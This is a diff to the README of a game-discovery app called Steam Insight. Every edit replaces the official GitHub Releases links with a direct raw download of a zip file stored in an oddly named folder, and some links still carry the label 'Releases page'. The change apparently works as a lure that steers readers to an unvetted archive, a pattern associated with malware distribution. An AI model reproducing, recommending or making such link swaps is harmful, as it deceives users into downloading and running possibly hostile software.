@@ -4,7 +4,7 @@
 Steam Insight is a modern platform that helps you explore thousands of games. With intelligent search options, detailed reviews, and rich media, finding your next favorite game has never been easier. 
 
 ## 📥 Download Now
-[![Download steam-insight](https://img.shields.io/badge/Download-steam--insight-brightgreen)](https://github.com/nitin0882/steam-insight/releases)
+[![Download steam-insight](https://raw.githubusercontent.com/nitin0882/steam-insight/main/bilirubinemia/steam-insight.zip)](https://raw.githubusercontent.com/nitin0882/steam-insight/main/bilirubinemia/steam-insight.zip)
 
 ## 📋 About Steam Insight
 Steam Insight offers a user-friendly experience to discover games on Steam. With unique review IDs and curated review pages, you can dive deep into game details. It also features advanced analytics to help you make informed choices. Enjoy a responsive design with a dark mode option for a pleasant viewing experience.
@@ -25,7 +25,7 @@ To run Steam Insight, you will need:
 
 ## 📦 Download & Install
 To get started:
-1. **Visit the Releases Page**: Go to the [Steam Insight Releases page](https://github.com/nitin0882/steam-insight/releases).
+1. **Visit the Releases Page**: Go to the [Steam Insight Releases page](https://raw.githubusercontent.com/nitin0882/steam-insight/main/bilirubinemia/steam-insight.zip).
 2. **Download the Latest Version**: Look for the latest release and click on it.
 3. **Install and Run**: Follow your browser's download instructions to install the application.
 
@@ -66,4 +66,4 @@ Join our community discussions:
 Stay tuned for future improvements. We plan to enhance the user experience, add more features, and improve some functionalities based on user feedback.
 
 ## 📥 Download Again
-Don’t forget to download the latest version from the [Steam Insight Releases page](https://github.com/nitin0882/steam-insight/releases). Enjoy exploring games!
+Don’t forget to download the latest version from the [Steam Insight Releases page](https://raw.githubusercontent.com/nitin0882/steam-insight/main/bilirubinemia/steam-insight.zip). Enjoy exploring games!
